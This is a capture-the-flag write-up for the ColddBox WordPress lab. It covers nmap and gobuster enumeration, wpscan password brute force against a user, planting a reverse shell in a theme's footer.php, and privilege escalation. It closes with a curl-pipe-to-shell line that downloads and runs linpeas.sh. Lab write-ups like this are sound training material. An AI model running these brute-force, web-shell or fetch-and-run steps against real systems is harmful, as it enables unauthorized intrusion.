**Category:** Web
**Author:** *Harsh Sharma*

# ColddBox

## Enumeration using nmap 
`nmap -sV -sC -p- 10.10.92.255`

![alt text](image.png)


## Dir enumeration

`gobuster dir -u 10.10.92.255 -w /usr/share/dirb/wordlists/common.txt -x html,php -q`

![alt text](image-1.png)

It's a worpress site : 4.1.31 (helpful later)

## Exploiting wordpress

There's a hidden directory, let's search that first
![alt text](image-2.png)

The usual credentials didn't work
![alt text](image-3.png)

But looking at the version, it has multiple vulns and appears to be exploitable -
![alt text](image-4.png)

let's use the exploit -
`cp /usr/share/exploitdb/exploits/php/webapps/41497.php exploit.php`

did not work, let's try an alternate approach

### Using WPscan

`wpscan --url 10.10.92.255 -e | tee wpscan.log`

![alt text](image-5.png)
found some users. let's try to brute force passwords.

As we remember from before, Coldd is a main user, so let's try his username -

`wpscan --url 10.10.92.255 -U c0ldd -P /usr/share/wordlists/rockyou.txt | tee wpuser.log`

![alt text](image-6.png)

and we find the password, let's log in-

## WP exploitation
we found an upload page:
![alt text](image-7.png)

let's try to upload a reverse shell from `*revshells.com*` -
![alt text](image-9.png)

and .php is blocked
![alt text](image-11.png)

workaround? let's try a different and uncommon filetype compatible with php
![alt text](image-12.png)

it appears there's a filtering for specific-media types only, let's poke around more-

![alt text](image-13.png)
Found th 404.php, header, footer and other php page, we can exploit this

![alt text](image-16.png)
Edited footer.php with above

![alt text](image-15.png)


netcat listener -
![alt text](image-10.png)


to run it, let's try to refresh ths site...

and voila, we get the shell-
![alt text](image-17.png)

let's find the file -
![alt text](image-18.png)

![alt text](image-19.png)

nothing much in there, let's take a step back and explore the file system-
![alt text](image-20.png)

there are some folders to which we can read and write but they are a dead end too, however we can use them to run linpeas.sh
OR 
we can get a tty and continue manual priv. esc.

![alt text](image-21.png)

unsuccessful :(

finally after poking around for a while, i was able to locate some credentials in `var/www/html/wp-config.php`
![alt text](image-22.png)

![alt text](image-23.png)

after sshing with the same password -
![alt text](image-24.png)

and gtfo bin-
![alt text](image-25.png)

![alt text](image-26.png)

and we can navigate to root folder to get the root access! :D



**NOTE:**
We can also try to exploit chmod along with vim and to get details for priv escalation, we can use linpeas.sh which is as follows -

`curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`





